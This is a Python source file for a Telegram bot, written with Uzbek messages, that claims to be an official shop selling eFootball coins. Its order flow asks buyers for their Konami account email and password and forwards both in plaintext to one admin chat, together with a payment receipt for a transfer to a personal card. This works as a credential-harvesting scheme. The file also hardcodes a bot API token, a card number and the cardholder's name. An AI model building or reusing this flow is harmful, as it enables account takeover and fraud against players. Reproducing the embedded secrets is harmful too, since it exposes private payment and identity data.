import logging
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# Bot sozlamalari
API_TOKEN = '8956019896:AAEaJfsOR4d59fEIwAQnrtyL_wOp01lIU6c'
ADMIN_ID = 1678146043  # Sizning shaxsiy Telegram ID raqamingiz
order_counter = 0  # Arizalarni raqamlash uchun hisoblagich

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Sotuvdagi paketlar va narxlar
COIN_PACKS = {
    "130_coin": {"name": "🪙 130 eFootball Coin", "price": "15,000 so'm"},
    "550_coin": {"name": "🪙 550 eFootball Coin", "price": "55,000 so'm"},
    "1050_coin": {"name": "🪙 1050 eFootball Coin", "price": "100,000 so'm"},
    "2150_coin": {"name": "🪙 2150 eFootball Coin", "price": "190,000 so'm"}
}

# Sizning hamyon ma'lumotlaringiz
CARD_INFO = "💳 Karta raqam: `9860 3501 0897 5409`\n👤 Ega: XUSANOVA MAQSUDA"

# FSM (Savol-javob bosqichlari)
class OrderState(StatesGroup):
    choosing_pack = State()
    entering_id = State()
    entering_password = State()
    sending_receipt = State()

# Bosh menyu tugmalari
def get_main_keyboard():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="🪙 Coin sotib olish"), KeyboardButton(text="📊 Narxlar va Paketlar")],
        [KeyboardButton(text="👨‍💻 Aloqa / Admin")]
    ], resize_keyboard=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        f"👋 Assalomu alaykum, {message.from_user.full_name}!\n"
        "eFootball Coin sotuvchi rasmiy botimizga xush kelibsiz.",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text == "📊 Narxlar va Paketlar")
async def show_prices(message: types.Message):
    text = "📋 **Bizdagi mavjud coin paketlari va narxlari:**\n\n"
    for pack in COIN_PACKS.values():
        text += f"▪️ {pack['name']} — {pack['price']}\n"
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "👨‍💻 Aloqa / Admin")
async def show_contact(message: types.Message):
    await message.answer("👨‍💻 Muammolar yoki takliflar bo'lsa admin bilan bog'laning: @Sizning_Usernamengiz")

@dp.message(F.text == "🪙 Coin sotib olish")
async def start_order(message: types.Message, state: FSMContext):
    buttons = [[InlineKeyboardButton(text=f"{v['name']} ({v['price']})", callback_data=k)] for k, v in COIN_PACKS.items()]
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    await message.answer("👇 Kerakli coin miqdorini tanlang:", reply_markup=keyboard)
    await state.set_state(OrderState.choosing_pack)

@dp.callback_query(OrderState.choosing_pack)
async def pack_chosen(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(pack=COIN_PACKS[callback.data]['name'])
    await callback.message.delete()
    await callback.message.answer("📧 Endi Konami ID (Elektron pochta) manzilingizni kiriting:")
    await state.set_state(OrderState.entering_id)

@dp.message(OrderState.entering_id)
async def id_entered(message: types.Message, state: FSMContext):
    await state.update_data(konami_id=message.text)
    await message.answer("🔑 Konami parolingizni kiriting:")
    await state.set_state(OrderState.entering_password)

@dp.message(OrderState.entering_password)
async def password_entered(message: types.Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer(
        f"To'lovni amalga oshiring va chek rasmini yuboring:\n\n{CARD_INFO}\n\n⚠️ Iltimos, faqat chek rasmini (skrinshot) yuboring!",
        reply_markup=types.ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )
    await state.set_state(OrderState.sending_receipt)

@dp.message(OrderState.sending_receipt, F.photo)
async def receipt_sent(message: types.Message, state: FSMContext):
    global order_counter
    order_counter += 1
    
    user_data = await state.get_data()
    photo_id = message.photo[-1].file_id
    
    # Adminga (Sizga) inline tugmali buyurtma yuborish
    admin_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Coin tashladim", callback_data=f"done_{message.from_user.id}_{order_counter}")]
    ])
    
    admin_text = (
        f"🚨 **YANGI BUYURTMA!**\n"
        f"🆔 **Buyurtma raqami:** #{order_counter}\n"
        f"👤 **Mijoz:** @{message.from_user.username or 'Yashirin'} (ID: {message.from_user.id})\n\n"
        f"📦 **Paket:** {user_data['pack']}\n"
        f"📧 **Konami ID:** `{user_data['konami_id']}`\n"
        f"🔑 **Parol:** `{user_data['password']}`"
    )
    
    try:
        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=admin_text, reply_markup=admin_markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Adminga xabar yuborishda xato: {e}")

    await message.answer(
        f"✅ Arizangiz muvaffaqiyatli qabul qilindi!\n"
        f"Sizning buyurtma raqamingiz: **#{order_counter}**\n\n"
        "Admin tez orada to'lovni tekshirib, coinlarni hisobingizga tushirib beradi.",
        reply_markup=get_main_keyboard()
    )
    await state.clear()

@dp.callback_query(F.data.startswith("done_"))
async def process_admin_done(callback: types.CallbackQuery):
    _, user_id, order_id = callback.data.split("_")
    
    try:
        # Mijozga avtomatik javob borishi
        await bot.send_message(
            chat_id=int(user_id),
            text=f"🎉 **Xushxabar!**\nSizning **#{order_id}** raqamli buyurtmangiz muvaffaqiyatli bajarildi. eFootball coinlaringiz o'yin hisobingizga tushirildi! ✅"
        )
        # Admindagi xabarni o'zgartirish (tugma yo'qoladi, status o'zgaradi)
        await callback.message.edit_caption(
            caption=callback.message.caption + "\n\n🟢 **BAJARILDI!** (Mijozga xabar yuborildi)",
            reply_markup=None,
            parse_mode="Markdown"
        )
    except Exception as e:
        await callback.answer("❌ Mijozga xabar yuborib bo'lmadi.")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
  
